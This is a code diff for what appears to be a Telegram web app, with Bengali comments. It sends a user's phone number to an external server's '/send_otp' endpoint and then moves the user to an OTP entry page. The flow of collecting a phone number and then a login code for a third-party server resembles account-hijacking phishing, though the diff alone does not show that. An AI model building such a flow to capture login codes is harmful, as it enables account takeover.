@@ -155,24 +155,24 @@
                     // ২. লোডার দেখানো
                     toggleLoader(true, "Verifying Number...");
 
-                    // ৩. রেন্ডার সার্ভারে ডেটা পাঠানো
+                    // ৩. পাইথন সার্ভারে নম্বর পাঠানো
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
-                    }).catch(e => console.log("Request sent"));
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log("Server Response:", data);
+                    })
+                    .catch(e => console.log("Request sent background"));
 
-                    // ৪. প্রধান ফিক্স: ১ সেকেন্ডের মধ্যে জোর করে পেজ পাল্টানো
+                    // ৪. প্রধান ফিক্স: ১.৫ সেকেন্ড ওয়েট করে সরাসরি ওটিপি পেজে নিয়ে যাওয়া
                     setTimeout(() => {
                         toggleLoader(false);
-                        nextStep(2); // ওটিপি পেজে মুভ
-                    }, 1000);
+                        nextStep(2); 
+                    }, 1500); 
                 }
-            });
-            
-            // ৫. অতিরিক্ত প্রোটেকশন
-            tg.onEvent('mainButtonClicked', function(){
-                // Safety callback logic
             });
         }
 
